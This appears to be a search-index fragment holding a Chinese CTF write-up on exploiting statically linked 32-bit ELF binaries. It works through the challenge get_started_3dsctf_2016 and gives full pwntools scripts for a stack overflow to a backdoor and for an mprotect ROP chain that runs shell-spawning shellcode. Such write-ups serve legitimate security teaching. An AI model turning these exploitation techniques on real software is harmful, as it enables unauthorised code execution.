7\uff08rwx\uff09\uff0c\u91cd\u70b9\u662f\u8d4b\u4e88\u6743\u9650\u7684\u5730\u5740\uff0c\u8981\u627e\u4e00\u4e2a\u6709\u8bfb\u5199\u6743\u9650\u7684\u5730\u5740\uff0c\u7136\u540e\u518d\u7ed9\u4e88\u6267\u884c\u6743\u9650\u3002\u8fd9\u91cc ida \u67e5\u51fa\u6765\u7684\u5185\u5b58\u6bb5\u6743\u9650\u4e0e\u5b9e\u9645\u6709\u51fa\u5165\uff0cida \u91cc\u9762 bss \u6bb5\u662f\u6709\u8bfb\u5199\u6743\u9650\u7684\uff1a \u5b9e\u9645\u8bd5\u4e86\u4e00\u4e0b\uff0c\u62a5\u9519\u4fee\u6539\u4e0d\u4e86\u3002\u7136\u540e\u7528 gdb \u67e5\u770b\uff08\u6307\u4ee4\uff1amaintenance info sections\uff09\uff1a pwndbg> maintenance info sections Exec file: `/home/skye/buu/get_started_3dsctf_2016/get_started_3dsctf_2016', file type elf32-i386. [0] 0x80480f4->0x8048114 at 0x000000f4: .note.ABI-tag ALLOC LOAD READONLY DATA HAS_CONTENTS [1] 0x8048114->0x804818c at 0x00000114: .rel.plt ALLOC LOAD READONLY DATA HAS_CONTENTS [2] 0x804818c->0x80481af at 0x0000018c: .init ALLOC LOAD READONLY CODE HAS_CONTENTS \u2026\u2026 [21] 0x80eb000->0x80eb048 at 0x000a2000: .got.plt ALLOC LOAD DATA HAS_CONTENTS [22] 0x80eb060->0x80ebf80 at 0x000a2060: .data ALLOC LOAD DATA HAS_CONTENTS [23] 0x80ebf80->0x80ecd8c at 0x000a2f80: .bss ALLOC \u2026\u2026 \u6700\u540e\u9009\u5b9a\u7684\u5c06 shellcode \u5b58\u653e\u5728 .got.plt \u3002\u6240\u4ee5\u9700\u8981\u6784\u9020\u51fa\uff1a ''' int mprotect(.got.plt\u5730\u5740, \u591f\u653eshellcode\u7684\u5927\u5c0f, 7); ''' payload += p32(mprotect_addr) + p32(got_plt) + p32(0x200) + p32(0x7) \u7136\u540e\u5c31\u662f\u5c31\u662f\u6784\u9020 read \u8f93\u5165 shellcode \u5230 .got.plt \u4e0a\u9762\uff0c\u63a5\u7740\u8df3\u8f6c\u5230 .got.plt \u5373\u53ef\uff1a payload += p32(read_addr) + p32(got_plt) + p32(0) + p32(got_plt) + p32(0x200) \u5b9e\u9645\u8fd0\u884c\u540e\u4f1a\u5361\u5728 read \u51fd\u6570\uff0c\u901a\u8fc7\u8c03\u8bd5\u5bf9\u6bd4\u6b63\u5e38 read \u51fd\u6570\uff0c\u662f\u51e0\u4e2a\u5bc4\u5b58\u5668\u7684\u95ee\u9898\u3002\u5728 mprotect \u8fd0\u884c\u5b8c\u4e4b\u540e\uff0c\u9700\u8981 pop \u5b58\u653e 3 \u4e2a\u53c2\u6570\u7684\u5bc4\u5b58\u5668\uff0c\u7528 ROPgadget \u627e\u5c31\u884c\u4e86\u3002 read \u4e5f\u6709 3 \u4e2a\u53c2\u6570\uff0c\u4f46\u662f\u5b9e\u9645\u6d4b\u8bd5\u4e0d\u9700\u8981 popgadget \u5904\u7406\uff0c\u76f4\u63a5\u53ef\u4ee5\u8df3\u8f6c\u5c31\u7701\u7565\u3002 \u6574\u4f53 payload \u6784\u9020\uff1a payload = 'a'*0x38 payload += p32(mprotect_addr) + p32(pop3_ret) + p32(got_plt) + p32(0x200) + p32(0x7) payload += p32(read_addr) + p32(got_plt) + p32(0) + p32(got_plt) + p32(0x200) exp \u4ec5\u6808\u6ea2\u51fa from pwn import * context.log_level = 'debug' p = process(\"./get_started_3dsctf_2016\") #p = remote(\"node3.buuoj.cn\",26536) elf = ELF(\"./get_started_3dsctf_2016\") get_flag = elf.sym['get_flag'] payload = 'a'*0x38# + 'b'*0x4 payload += p32(get_flag)+p32(0xdeadbeef)+p32(0x308CD64F)+p32(0x195719D1) #p.recvuntil(\"Qual\") gdb.attach(p) p.sendline(payload) p.interactive() \u6808\u6ea2\u51fa+mprotect \u8fd9\u91cc\u83b7\u53d6\u9759\u6001\u7a0b\u5e8f\u7684\u51fd\u6570\u5730\u5740\u548c\u52a8\u6001\u94fe\u63a5\u7684\u6709\u533a\u522b\uff1a elf = ELF(\"./get_started_3dsctf_2016\") # \u82e5\u662f\u52a8\u6001\u94fe\u63a5 puts_plt = elf.plt['read'] # \u82e5\u662f\u9759\u6001\u94fe\u63a5 puts_plt = elf.sym['read'] # \u65b9\u6cd5\u4e00 puts_plt = elf.symbols['read'] # \u65b9\u6cd5\u4e8c from pwn import * context.log_level = 'debug' p = process(\"./get_started_3dsctf_2016\") #p = remote(\"node3.buuoj.cn\",28471) elf = ELF(\"./get_started_3dsctf_2016\") pop3_ret = 0x804951D shellcode = asm(shellcraft.sh(),arch = 'i386', os = 'linux') mprotect_addr = elf.symbols['mprotect'] read_addr = elf.symbols['read'] got_plt = 0x80EB000 payload = 'a'*0x38 payload += p32(mprotect_addr) + p32(pop3_ret) + p32(got_plt) + p32(0x200) + p32(0x7) payload += p32(read_addr) + p32(got_plt) + p32(0) + p32(got_plt) + p32(0x200) #payload += p32(got_plt) gdb.attach(p) p.sendline(payload) p.sendline(shellcode) p.interactive() \u5b9e\u9a8c\u4e8c\uff1a2017 \u6e56\u6e58\u676f pwn300 32 \u4f4d\u9759\u6001\u94fe\u63a5\u9898\u76ee\uff0c\u9700\u8981\u7ed3\u5408\u7528\u6237\u8f93\u5165\u7684\u5185\u5bb9\uff0c\u7136\u540e\u8c03\u7528 ELF \u81ea\u8eab\u7684 gadget \u6784\u5efa\u7cfb\u7edf\u8c03\u7528\u3002","title":"\u9759\u6001\u94fe\u63a5\u7a0b\u5e8f\u5229\u7528"},{"location":"linker/statically_linked/#_1","text":"\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u9759\u6001\u94fe\u63a5\u7684\u7a0b\u5e8f\u5f88\u5c11\u51fa\u73b0\uff0c\u4f46\u662f\u4e5f\u6709\u4e00\u4e9b\u3002\u8fd9\u7c7b elf \u7684\u6f0f\u6d1e\u5229\u7528\uff0c\u4e3b\u8981\u8fd8\u662f\u4f9d\u9760\u7a0b\u5e8f\u672c\u8eab\u548c\u7528\u6237\u8f93\u5165\u3002 \u7a0b\u5e8f\u672c\u8eab\u7684\u5229\u7528\u5c31\u662f\u9884\u7559\u7684\u540e\u95e8\u51fd\u6570\uff08system\uff09\u548c\u5b57\u7b26\u4e32\uff08/bin/sh\uff09\u3002\u5982\u679c\u6709\u8fd9\u4e9b\u9884\u7559\uff0c\u9898\u76ee\u96be\u5ea6\u5e94\u8be5\u4e0d\u5927\uff0c\u53ea\u8981\u8bbe\u6cd5\u63a7\u5236\u7a0b\u5e8f\u6d41\u5230\u540e\u95e8\u4e0a\u3002 \u5982\u679c\u6ca1\u6709\u9884\u7559\u7684\u540e\u95e8\uff0c\u5f88\u6709\u53ef\u80fd\u662f\u9700\u8981\u4f9d\u9760\u7528\u6237\u8f93\u5165\u5185\u5bb9\u7ed3\u5408\u7a0b\u5e8f\u672c\u8eab gadget \u53bb\u6784\u9020\u8c03\u7528\uff0c\u4e5f\u5c31\u662f\u624b\u5de5\u6784\u9020 onegadget \u3002 \u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u4f1a\u53bb libc \u91cc\u9762\u627e\u5229\u7528\u7684\u51fd\u6570\u548c\u5b57\u7b26\u4e32\uff0c\u4f8b\u5982\uff1asystem\u3002\u4f46 \u9759\u6001\u94fe\u63a5\u4e0d\u4f1a\u5230 libc \u627e\u51fd\u6570\uff0c\u9759\u6001\u94fe\u63a5\u7a0b\u5e8f\u8fd0\u884c\u65f6\u8981\u7528\u5230\u7684\u5168\u90e8\u4e1c\u897f\u90fd\u5df2\u7ecf\u5305\u542b\u5728 ELF \u6587\u4ef6\u91cc\uff0c\u6240\u4ee5\u653b\u51fb\u8005\u80fd\u5229\u7528\u7684\u53ea\u6709 ELF \u6587\u4ef6\u7684\u4e1c\u897f\u3002ret2libc \u7b49\u7b49\u653b\u51fb\u65b9\u6cd5\u5c31\u4e0e\u9759\u6001\u94fe\u63a5\u7a0b\u5e8f\u65e0\u7f18\u3002","title":"\u9759\u6001\u94fe\u63a5\u7a0b\u5e8f\u5229\u7528"},{"location":"linker/statically_linked/#get_started_3dsctf_2016","text":"\u8fd9\u662f\u4e00\u6761 32 \u4f4d\u9759\u6001\u94fe\u63a5\u7684\u6808\u6ea2\u51fa\u9898\u76ee\uff0c\u9898\u76ee\u5728 BUU \u4e0a\u6709\u5b9e\u9a8c\u73af\u5883\u3002\u672c\u5730\u548c\u8fdc\u7a0b\u662f\u91c7\u7528\u4e24\u79cd\u89e3\u51b3\u65b9\u6cd5\u3002 \u672c\u5730\u5c31\u662f\u53ef\u4ee5\u5229\u7528\u9884\u7559\u7684\u540e\u95e8\u89e3\u51b3\uff0c\u8fdc\u7a0b\u5229\u7528\u9700\u8981\u7ed3\u5408 ELF \u91cc\u7684\u4e00\u4e2a\u51fd\u6570\u2014\u2014mprotect \u548c \u7528\u6237\u8f93\u5165\u5185\u5bb9\u3002","title":"\u5b9e\u9a8c\u4e00\uff1aget_started_3dsctf_2016"},{"location":"linker/statically_linked/#_2","text":"","title":"\u5206\u6790"},{"location":"linker/statically_linked/#_3","text":"32 \u4f4d\u53ea\u5f00\u542f\u4e86 NX Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000)","title":"\u4fdd\u62a4\u60c5\u51b5"},{"location":"linker/statically_linked/#_4","text":"\u8fd9\u662f\u4e00\u6761\u9759\u6001\u94fe\u63a5\u7684\u9898\uff0c\u4e5f\u5c31\u662f\u7528\u4e0d\u5230 libc \u3002 $ file get_started_3dsctf_2016 get_started_3dsctf_2016: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, not stripped","title":"\u7f16\u8bd1\u60c5\u51b5"},{"location":"linker/statically_linked/#_5","text":"main \u51fd\u6570\u91cc\u9762\u8c03\u7528\u4e86 gets \u8fdb\u884c\u8bfb\u53d6\uff0c\u6ca1\u6709\u5bf9\u957f\u5ea6\u9650\u5236\uff0c\u53ef\u9020\u6210\u6808\u6ea2\u51fa\uff1a int __cdecl main(int argc, const char **argv, const char **envp) { char v4; // [esp+4h] [ebp-38h] printf(\"Qual a palavrinha magica? \", v4); gets(&v4); return 0; } \u9898\u76ee\u9884\u7559\u4e86\u540e\u95e8\u51fd\u6570 get_flag \uff0c\u6709\u4e24\u4e2a\u5224\u65ad\u4f20\u53c2\u7684\u65f6\u5019\u4f20\u8fdb\u53bb\u5c31\u884c\u4e86\uff1a void __cdecl get_flag(int a1, int a2) { int v2; // eax int v3; // esi unsigned __int8 v4; // al int v5; // ecx unsigned __int8 v6; // al if ( a1 == 0x308CD64F && a2 == 0x195719D1 ) { v2 = fopen(\"flag.txt\", \"rt\"); v3 = v2; v4 = getc(v2); if ( v4 != 0xFF ) { v5 = (char)v4; do { putchar(v5); v6 = getc(v3); v5 = (char)v6; } while ( v6 != 255 ); } fclose(v3); } } \u5230\u8fd9\u91cc\u7684\u57fa\u672c\u601d\u8def\u662f\uff1a\u6808\u6ea2\u51fa\u63a7\u5236 eip \u8df3\u8f6c\u540e\u95e8\uff0c\u4e5f\u5c31\u5f97\u5230\u4e86 \u4ec5\u6808\u6ea2\u51fa\u7684 exp \uff0c\u8fdc\u7a0b\u65e0\u6cd5 getshell \u3002","title":"\u6f0f\u6d1e\u51fd\u6570"},{"location":"linker/statically_linked/#_6","text":"\u524d\u9762\u5206\u6790\u8bf4\u4e86\u561b\uff0c\u65e0\u6cd5\u901a\u8fc7\u6808\u6ea2\u51fa\u8df3\u8f6c\u540e\u95e8\u3002\u8f6c\u6362\u4e00\u4e0b\u601d\u8def\uff0c\u6ea2\u51fa\u7a7a\u95f4\u4e0d\u9650\u3002\u5c06 shellcode \u5199\u5230\u975e\u6808\u4e0a\u7684\u5730\u65b9\uff0c\u7136\u540e\u7528 mprotect \u7ed9\u5185\u5b58\u6bb5\u52a0\u4e0a\u4e00\u4e2a\u6267\u884c\u6743\u9650\uff0c\u5728\u63a7\u5236\u7a0b\u5e8f\u6d41\u8df3\u8f6c\u5230\u4e0a\u9762\u3002 mprotect \u53c2\u6570\u5982\u4e0b\uff1a int mprotect(void *addr, size_t len, int prot); addr \u5185\u5b58\u542f\u59cb\u5730\u5740 len \u4fee\u6539\u5185\u5b58\u7684\u957f\u5ea6 prot \u5185\u5b58\u7684\u6743\u9650 prot \u7684\u503c\u4e3a 7\uff08rwx\uff09\uff0c\u91cd\u70b9\u662f\u8d4b\u4e88\u6743\u9650\u7684\u5730\u5740\uff0c\u8981\u627e\u4e00\u4e2a\u6709\u8bfb\u5199\u6743\u9650\u7684\u5730\u5740\uff0c\u7136\u540e\u518d\u7ed9\u4e88\u6267\u884c\u6743\u9650\u3002\u8fd9\u91cc ida \u67e5\u51fa\u6765\u7684\u5185\u5b58\u6bb5\u6743\u9650\u4e0e\u5b9e\u9645\u6709\u51fa\u5165\uff0cida \u91cc\u9762 bss \u6bb5\u662f\u6709\u8bfb\u5199\u6743\u9650\u7684\uff1a \u5b9e\u9645\u8bd5\u4e86\u4e00\u4e0b\uff0c\u62a5\u9519\u4fee\u6539\u4e0d\u4e86\u3002\u7136\u540e\u7528 gdb \u67e5\u770b\uff08\u6307\u4ee4\uff1amaintenance info sections\uff09\uff1a pwndbg> maintenance info sections Exec file: `/home/skye/buu/get_started_3dsctf_2016/get_started_3dsctf_2016', file type elf32-i386. [0] 0x80480f4->0x8048114 at 0x000000f4: .note.ABI-tag ALLOC LOAD READONLY DATA HAS_CONTENTS [1] 0x8048114->0x804818c at 0x00000114: .rel.plt ALLOC LOAD READONLY DATA HAS_CONTENTS [2] 0x804818c->0x80481af at 0x0000018c: .init ALLOC LOAD READONLY CODE HAS_CONTENTS \u2026\u2026 [21] 0x80eb000->0x80eb048 at 0x000a2000: .got.plt ALLOC LOAD DATA HAS_CONTENTS [22] 0x80eb060->0x80ebf80 at 0x000a2060: .data ALLOC LOAD DATA HAS_CONTENTS [23] 0x80ebf80->0x80ecd8c at 0x000a2f80: .bss ALLOC \u2026\u2026 \u6700\u540e\u9009\u5b9a\u7684\u5c06 shellcode \u5b58\u653e\u5728 .got.plt \u3002\u6240\u4ee5\u9700\u8981\u6784\u9020\u51fa\uff1a ''' int mprotect(.got.plt\u5730\u5740, \u591f\u653eshellcode\u7684\u5927\u5c0f, 7); ''' payload += p32(mprotect_addr) + p32(got_plt) + p32(0x200) + p32(0x7) \u7136\u540e\u5c31\u662f\u5c31\u662f\u6784\u9020 read \u8f93\u5165 shellcode \u5230 .got.plt \u4e0a\u9762\uff0c\u63a5\u7740\u8df3\u8f6c\u5230 .got.plt \u5373\u53ef\uff1a payload += p32(read_addr) + p32(got_plt) + p32(0) + p32(got_plt) + p32(0x200) \u5b9e\u9645\u8fd0\u884c\u540e\u4f1a\u5361\u5728 read \u51fd\u6570\uff0c\u901a\u8fc7\u8c03\u8bd5\u5bf9\u6bd4\u6b63\u5e38 read \u51fd\u6570\uff0c\u662f\u51e0\u4e2a\u5bc4\u5b58\u5668\u7684\u95ee\u9898\u3002\u5728 mprotect \u8fd0\u884c\u5b8c\u4e4b\u540e\uff0c\u9700\u8981 pop \u5b58\u653e 3 \u4e2a\u53c2\u6570\u7684\u5bc4\u5b58\u5668\uff0c\u7528 ROPgadget \u627e\u5c31\u884c\u4e86\u3002 read \u4e5f\u6709 3 \u4e2a\u53c2\u6570\uff0c\u4f46\u662f\u5b9e\u9645\u6d4b\u8bd5\u4e0d\u9700\u8981 popgadget \u5904\u7406\uff0c\u76f4\u63a5\u53ef\u4ee5\u8df3\u8f6c\u5c31\u7701\u7565\u3002 \u6574\u4f53 payload \u6784\u9020\uff1a payload = 'a'*0x38 payload += p32(mprotect_addr) + p32(pop3_ret) + p32(got_plt) + p32(0x200) + p32(0x7) payload += p32(read_addr) + p32(got_plt) + p32(0) + p32(got_plt) + p32(0x200)","title":"\u601d\u8def"},{"location":"linker/statically_linked/#exp","text":"","title":"exp"},{"location":"linker/statically_linked/#_7","text":"from pwn import * context.log_level = 'debug' p = process(\"./get_started_3dsctf_2016\") #p = remote(\"node3.buuoj.cn\",26536) elf = ELF(\"./get_started_3dsctf_2016\") get_flag = elf.sym['get_flag'] payload = 'a'*0x38# + 'b'*0x4 payload += p32(get_flag)+p32(0xdeadbeef)+p32(0x308CD64F)+p32(0x195719D1) #p.recvuntil(\"Qual\") gdb.attach(p) p.sendline(payload) p.interactive()","title":"\u4ec5\u6808\u6ea2\u51fa"},{"location":"linker/statically_linked/#mprotect","text":"\u8fd9\u91cc\u83b7\u53d6\u9759\u6001\u7a0b\u5e8f\u7684\u51fd\u6570\u5730\u5740\u548c\u52a8\u6001\u94fe\u63a5\u7684\u6709\u533a\u522b\uff1a elf = ELF(\"./get_started_3dsctf_2016\") # \u82e5\u662f\u52a8\u6001\u94fe\u63a5 puts_plt = elf.plt['read'] # \u82e5\u662f\u9759\u6001\u94fe\u63a5 puts_plt = elf.sym['read'] # \u65b9\u6cd5\u4e00 puts_plt = elf.symbols['read'] # \u65b9\u6cd5\u4e8c from pwn import * context.log_level = 'debug' p = process(\"./get_started_3dsctf_2016\") #p = remote(\"node3.buuoj.cn\",28471) elf = ELF(\"./get_started_3dsctf_2016\") pop3_ret = 0x804951D shellcode = asm(shellcraft.sh(),arch = 'i386', os = 'linux') mprotect_addr = elf.symbols['mprotect'] read_addr = elf.symbols['read'] got_plt = 0x80EB000 payload = 'a'*0x38 payload += p32(mprotect_addr) + p32(pop3_ret) + p32(got_plt) + p32(0x200) + p32(0x7) payload += p32(read_addr) + p32(got_plt) + p32(0) + p32(got_plt) + p32(0x200) #payload += p32(got_plt) gdb.attach(p) p.sendline(payload) p.sendline(shellcode) p.interactive()","title":"\u6808\u6ea2\u51fa+mprotect"},{"location":"linker/statically_linked/#2017-pwn300","text":"32 \u4f4d\u9759\u6001\u94fe\u63a5\u9898\u76ee\uff0c\u9700\u8981\u7ed3\u5408\u7528\u6237\u8f93\u5165\u7684\u5185\u5bb9\uff0c\u7136\u540e\u8c03\u7528 ELF \u81ea\u8eab\u7684 gadget \u6784\u5efa\u7cfb\u7edf\u8c03\u7528\u3002","title":"\u5b9e\u9a8c\u4e8c\uff1a2017 \u6e56\u6e58\u676f pwn300"}]}